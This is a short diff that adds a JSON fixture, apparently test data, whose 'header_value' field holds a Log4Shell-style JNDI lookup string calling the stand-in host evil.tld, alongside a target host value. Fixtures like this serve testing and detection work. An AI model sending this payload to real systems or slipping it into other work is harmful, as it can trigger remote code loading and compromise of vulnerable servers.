@@ -1,0 +1,4 @@
+{
+  "header_value": "${jndi:ldap://evil.tld/x}",
+  "host": "app.corp.com"
+}
